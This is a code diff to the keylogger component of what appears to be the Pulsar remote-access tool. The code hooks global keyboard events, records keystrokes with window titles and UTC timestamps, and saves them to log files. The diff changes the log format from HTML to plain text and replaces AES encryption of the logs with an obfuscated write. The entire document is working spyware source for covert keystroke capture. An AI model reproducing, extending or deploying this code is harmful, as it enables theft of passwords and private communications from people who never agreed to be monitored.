@@ -2,7 +2,6 @@
 using Pulsar.Client.Config;
 using Pulsar.Client.Extensions;
 using Pulsar.Client.Helper;
-using Pulsar.Common.Cryptography;
 using Pulsar.Common.Helpers;
 using System;
 using System.Collections.Generic;
@@ -10,7 +9,6 @@ using System.Diagnostics;
 using System.Globalization;
 using System.IO;
 using System.Text;
-using System.Web;
 using System.Windows.Forms;
 using Timer = System.Timers.Timer;
 
@@ -61,11 +59,6 @@ namespace Pulsar.Client.Logging
         /// Used to hook global mouse and keyboard events.
         /// </summary>
         private readonly IKeyboardMouseEvents _mEvents;
-
-        /// <summary>
-        /// Provides encryption and decryption methods to securely store log files.
-        /// </summary>
-        private readonly Aes256 _aesInstance = new Aes256(Settings.ENCRYPTIONKEY);
 
         /// <summary>
         /// The maximum size of a single log file.
@@ -152,10 +145,10 @@ namespace Pulsar.Client.Logging
             if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
             {
                 _lastWindowTitle = activeWindowTitle;
-                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>"
-                    + HttpUtility.HtmlEncode(activeWindowTitle) + " - "
-                    + DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo)
-                    + " UTC</b>]</p><br>");
+                _logFileBuffer.AppendLine();
+                _logFileBuffer.AppendLine();
+                _logFileBuffer.AppendLine($"[{activeWindowTitle} - {DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo)} UTC]");
+                _logFileBuffer.AppendLine();
             }
 
             if (_pressedKeys.ContainsModifierKeys())
@@ -193,15 +186,15 @@ namespace Pulsar.Client.Logging
 
             if ((!_pressedKeyChars.Contains(e.KeyChar) || !DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
             {
-                var filtered = HttpUtility.HtmlEncode(e.KeyChar.ToString());
-                if (!string.IsNullOrEmpty(filtered))
+                var keyChar = e.KeyChar.ToString();
+                if (!string.IsNullOrEmpty(keyChar))
                 {
-                    Debug.WriteLine("OnKeyPress Output: " + filtered);
+                    Debug.WriteLine("OnKeyPress Output: " + keyChar);
                     if (_pressedKeys.ContainsModifierKeys())
                         _ignoreSpecialKeys = true;
 
                     _pressedKeyChars.Add(e.KeyChar);
-                    _logFileBuffer.Append(filtered);
+                    _logFileBuffer.Append(keyChar);
                 }
             }
         }
@@ -214,7 +207,7 @@ namespace Pulsar.Client.Logging
         /// <remarks>This event handler is called third.</remarks>
         private void OnKeyUp(object sender, KeyEventArgs e)
         {
-            _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
+            _logFileBuffer.Append(FormatSpecialKeys(_pressedKeys.ToArray()));
             _pressedKeyChars.Clear();
         }
 
@@ -230,11 +223,11 @@ namespace Pulsar.Client.Logging
         }
 
         /// <summary>
-        /// Adds special highlighting in HTML to the special keys.
+        /// Formats special keys as raw text without HTML formatting.
         /// </summary>
         /// <param name="keys">The input keys.</param>
-        /// <returns>The highlighted special keys.</returns>
-        private string HighlightSpecialKeys(Keys[] keys)
+        /// <returns>The formatted special keys as raw text.</returns>
+        private string FormatSpecialKeys(Keys[] keys)
         {
             if (keys.Length < 1) return string.Empty;
 
@@ -244,7 +237,7 @@ namespace Pulsar.Client.Logging
                 if (!_ignoreSpecialKeys)
                 {
                     names[i] = keys[i].GetDisplayName();
-                    Debug.WriteLine("HighlightSpecialKeys: " + keys[i] + " : " + names[i]);
+                    Debug.WriteLine("FormatSpecialKeys: " + keys[i] + " : " + names[i]);
                 }
                 else
                 {
@@ -263,17 +256,15 @@ namespace Pulsar.Client.Logging
                 for (int i = 0; i < names.Length; i++)
                 {
                     _pressedKeys.Remove(keys[i]);
-                    if (string.IsNullOrEmpty(names[i])) continue;
-
-                    specialKeys.AppendFormat((validSpecialKeys == 0) ? @"<p class=""h"">[{0}" : " + {0}", names[i]);
+                    if (string.IsNullOrEmpty(names[i])) continue; specialKeys.Append((validSpecialKeys == 0) ? $"[{names[i]}" : $" + {names[i]}");
                     validSpecialKeys++;
                 }
 
-                // If there are items in the special keys string builder, give it an ending tag
+                // If there are items in the special keys string builder, give it an ending bracket
                 if (validSpecialKeys > 0)
-                    specialKeys.Append("]</p>");
+                    specialKeys.Append("]");
 
-                Debug.WriteLineIf(specialKeys.Length > 0, "HighlightSpecialKeys Output: " + specialKeys.ToString());
+                Debug.WriteLineIf(specialKeys.Length > 0, "FormatSpecialKeys Output: " + specialKeys.ToString());
                 return specialKeys.ToString();
             }
 
@@ -282,23 +273,24 @@ namespace Pulsar.Client.Logging
             for (int i = 0; i < names.Length; i++)
             {
                 _pressedKeys.Remove(keys[i]);
-                if (string.IsNullOrEmpty(names[i])) continue;
-
-                switch (names[i])
+                if (string.IsNullOrEmpty(names[i])) continue; switch (names[i])
                 {
                     case "Return":
-                        normalKeys.Append(@"<p class=""h"">[Enter]</p><br>");
+                        normalKeys.AppendLine();
+                        normalKeys.Append("[Enter]");
                         break;
+
                     case "Escape":
-                        normalKeys.Append(@"<p class=""h"">[Esc]</p>");
+                        normalKeys.Append("[Esc]");
                         break;
+
                     default:
-                        normalKeys.Append(@"<p class=""h"">[" + names[i] + "]</p>");
+                        normalKeys.Append($"[{names[i]}]");
                         break;
                 }
             }
 
-            Debug.WriteLineIf(normalKeys.Length > 0, "HighlightSpecialKeys Output: " + normalKeys.ToString());
+            Debug.WriteLineIf(normalKeys.Length > 0, "FormatSpecialKeys Output: " + normalKeys.ToString());
             return normalKeys.ToString();
         }
 
@@ -348,16 +340,10 @@ namespace Pulsar.Client.Logging
                 if (!File.Exists(filePath))
                     writeHeader = true;
 
-                StringBuilder logFile = new StringBuilder();
-
-                if (writeHeader)
+                StringBuilder logFile = new StringBuilder(); if (writeHeader)
                 {
-                    logFile.Append(
-                        "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
-                        DateTime.UtcNow.ToString("f", DateTimeFormatInfo.InvariantInfo) + " UTC<br><br>");
-
-                    logFile.Append("<style>.h { color: 0000ff; display: inline; }</style>");
-
+                    logFile.AppendLine($"Log created on {DateTime.UtcNow.ToString("f", DateTimeFormatInfo.InvariantInfo)} UTC");
+                    logFile.AppendLine();
                     _lastWindowTitle = string.Empty;
                 }
 
@@ -366,7 +352,7 @@ namespace Pulsar.Client.Logging
                     logFile.Append(_logFileBuffer);
                 }
 
-                FileHelper.WriteLogFile(filePath, logFile.ToString(), _aesInstance);
+                FileHelper.WriteObfuscatedLogFile(filePath, logFile.ToString());
 
                 logFile.Clear();
             }
